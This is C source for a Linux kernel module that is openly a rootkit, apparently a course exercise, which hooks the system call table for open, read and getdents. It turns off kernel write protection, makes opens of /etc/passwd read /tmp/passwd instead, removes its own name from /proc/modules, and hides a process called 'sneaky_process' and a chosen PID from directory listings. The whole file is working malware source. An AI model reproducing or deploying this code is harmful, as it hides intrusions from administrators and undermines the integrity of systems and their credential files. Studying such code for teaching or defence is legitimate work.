#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
//#include <linux/stdio.h>
#include <linux/string.h>
//Macros for kernel functions to alter Control Register 0 (CR0)
//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
//Bit 0 is the WP-bit (write protection). We want to flip this to 0
//so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))
#define BUFFLEN 256
#define ORIGINAL 0
struct linux_dirent {
  u64 d_ino;
  s64 d_off;
  unsigned short d_reclen;
  char d_name[BUFFLEN];
}; 
//These are function pointers to the system calls that change page
//permissions for the given address (page) to read-only or read-write.
//Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-4.4.0-116-generic
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff810707b0;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81070730;

//This is a pointer to the system call table in memory
//Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
//We're getting its adddress from the System.map file (see above).
MODULE_LICENSE("ROOTKIT");
MODULE_AUTHOR("TONG");
static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;
static int sneaky_fd=-1;
static int module_fd=-1;
char* sneaky_pid="";
module_param(sneaky_pid,charp,0000);
MODULE_PARM_DESC(sneaky_pid, "A string");

//Function pointer will be used to save address of original 'open' syscall.
//The asmlinkage keyword is a GCC #define that indicates this function
//should expect ti find its arguments on the stack (not in registers).
//This is used for all system calls.
asmlinkage int (*original_call)(const char *pathname, int flags);
//open
//Define our new sneaky version of the 'open' syscall
asmlinkage int sneaky_sys_open(const char *pathname, int flags)
{
  printk(KERN_INFO "My pid is : %s", sneaky_pid);
  if(strstr(pathname,"/etc/passwd")!=0){
    //int fd;
     char*sneaky_pathname="/tmp/passwd";
     copy_to_user((char*)pathname,sneaky_pathname,strlen(sneaky_pathname));
    sneaky_fd=(*original_call)(pathname,flags);

    return sneaky_fd;
  }
  if(strstr(pathname,"/proc/modules")!=0){
    module_fd = (*original_call)(pathname,flags);
    return module_fd;
  }
  printk(KERN_INFO "Very, very Sneaky!\n");
  return (*original_call)(pathname,flags);
  
  
  
  
  //sneaky_fd=original_call(pathname, flags);
  //return sneaky_fd;
}
/*
//close
asmlinkage int (*original_close)(int fd);
asmlinkage int sneaky_close(int fd){
    if(sneaky_fd==fd){
        printk(KERN_INFO "sneaky close!\n");
        sneaky_fd=-1;
    }
    return (*original_close)(fd);
}
*/

int compare_strings(const char * ptr1, const char * ptr2) {
  while(*ptr1 && *ptr2) {
    if(*ptr1 != *ptr2) {
      return -1;
    }
    ptr1++;
    ptr2++;
  }
  return 0;
}
//read
asmlinkage ssize_t (*original_read)(int fd, void*buf, size_t count);
asmlinkage ssize_t sneaky_read(int fd, void*buf, size_t count) {
  ssize_t nbytes = (*original_read)(fd,buf,count);
  
  if (ORIGINAL == 0) {
    if(fd==module_fd){
      int len;
      char * tmp1=(char*)buf;
      while(tmp1 < ((char*) buf + nbytes)){
	if(compare_strings(tmp1,"my_sneaky_mod")==0){
	  char*tmp2=tmp1;
	  while(*tmp1!='\n'&& tmp1 < (char *) buf + nbytes){
	    tmp1++;
	  }
	  tmp1++;
	  len=tmp1-tmp2;
	  //memmove(tmp1,tmp2,nbytes-(tmp2-(char*)buf));
	  while(((char*)buf + nbytes) - tmp1 > 0) {
	    *tmp2 = *tmp1;
	    tmp2++;
	    tmp1++;
	  }
	  return nbytes - len;
	}
	while(*tmp1!='\n' && tmp1 < ((char*) buf + nbytes)){
	  tmp1++;
	}
	tmp1++;
      }
    }
  }
    
	

    
  /* char*init=strstr((char*)buf,"my_sneaky_mod");
    if(init!=NULL && fd==module_fd){
      //while (strchr(init, '\n')==NULL){
      //nbyte+=(*original_read)(fd,buf+nbyte,count);
      //}
      char * end = strchr(init, '\n');
      if(end != NULL) {
	printk(KERN_INFO "end is not null\n");
	end += 1;
	memmove(buf + (init - (char *) buf), buf + (end - (char *) buf), nbytes - (end - (char *) buf));
	nbytes -= end - init;
	printk(KERN_INFO "end is not null exit\n");
      } else {
	nbytes = init - (char *) buf;
      }
      
    }
    }*/
    
  return nbytes;
}
  
    
//getdents
/*
char * str_dir="/proc/";
char * str_dir_pid;
printk(str_dir_pid,"%d",pid);
strcat(str_dir,str_dir_pid);
*/
asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent * dirp, unsigned int count);
asmlinkage int sneaky_getdents(unsigned int fd, struct linux_dirent *dirp,unsigned int count){
  int tbyte;
  if (ORIGINAL == 0) {
    int tlen;
    char str_dir_pid[64];
    sprintf(str_dir_pid,"%s",sneaky_pid);
    printk("str_dir_pid: %s\n",str_dir_pid);
    
  struct linux_dirent *cur=dirp;
  tbyte=original_getdents(fd,dirp,count);
  tlen=tbyte;
  while(tlen>0){
    tlen-=cur->d_reclen;
    if(strcmp(cur->d_name,"sneaky_process")==0||strstr(cur->d_name,str_dir_pid)!=0){
      tbyte-=cur->d_reclen;
      memmove(cur,(char*)cur+cur->d_reclen,tlen);
    }
    else{
      if(tlen>0){
        cur=(struct linux_dirent *)((char*)cur+cur->d_reclen);
      }
    }
  }
  } else {
    tbyte=original_getdents(fd,dirp,count);
  }
  return tbyte;
}
    

//The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  struct page *page_ptr;

  //See /var/log/syslog for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is the magic! Save away the original 'open' system call
  //function address. Then overwrite its address in the system call
  //table with the function address of our new code.
  original_call = (void*)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
  original_read=(void*)*(sys_call_table + __NR_read);
  *(sys_call_table + __NR_read) = (unsigned long)sneaky_read;
  /*original_close=(void*)*(sys_call_table + __NR_close);
  *(sys_call_table + __NR_close) = (unsigned long)sneaky_close;
  */  
  original_getdents=(void*)*(sys_call_table + __NR_getdents);
  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_getdents;
  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  struct page *page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is more magic! Restore the original 'open' system call
  //function address. Will look like malicious code was never there!
  *(sys_call_table + __NR_open) = (unsigned long)original_call;
  *(sys_call_table + __NR_read) = (unsigned long)original_read;
  *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  

